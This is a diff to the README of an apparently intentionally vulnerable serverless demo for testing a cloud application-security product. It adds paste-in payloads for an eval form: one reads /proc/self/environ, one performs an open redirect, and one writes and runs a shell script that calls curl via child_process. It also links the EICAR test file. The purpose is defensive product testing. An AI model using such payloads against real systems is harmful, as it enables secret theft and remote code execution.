@@ -31,20 +31,42 @@ serverless deploy
 ### Testing Different Security Modules
 
 #### Malicious Payload
+
+3. Go to the Cloud One Applicaiton Security Console to view the attack event. 
+
+#### Malicious File Upload 
 1. Download a malware TEST file from [eicar](https://secure.eicar.org/eicar.com)
 2. Click on 'Upload File', select the eicar test file, and then hit 'Submit'. 
 3. Go to the Cloud One Applicaiton Security Console to view the attack event. 
 
-#### Malicious File Upload 
-
-3. Go to the Cloud One Applicaiton Security Console to view the attack event. 
-
 #### Illegal File Access
-
+1. Paste the following scripts into the form labeled "Eval Form": 
+```
+require('fs').readFileSync('/proc/self/environ').toString()
+```
+2. Click on the "Submit" button.
 3. Go to the Cloud One Applicaiton Security Console to view the attack event. 
 #### Open Redirect
-
+1. Paste the following scripts into the form labeled "Eval Form": 
+```
+res.redirect(encodeURI('https://www.facebook.com'))
+```
+2. Click on the "Submit" button.
 3. Go to the Cloud One Applicaiton Security Console to view the attack event. 
 #### Remote Command Execution
-
+1. Paste the following scripts into the form labeled "Eval Form": 
+```
+let time = new Date();
+require('fs').writeFileSync(`/tmp/${time}`,`curl http://example.com && touch /tmp/new-${time}`);
+const { exec } = require('child_process');
+var yourscript = exec(`sh /tmp/${time}`,
+        (error, stdout, stderr) => {
+            console.log(stdout);
+            console.log(stderr);
+            if (error !== null) {
+                console.log(`exec error: ${error}`);
+            }
+        });
+```
+2. Click on the "Submit" button.
 3. Go to the Cloud One Applicaiton Security Console to view the attack event. 
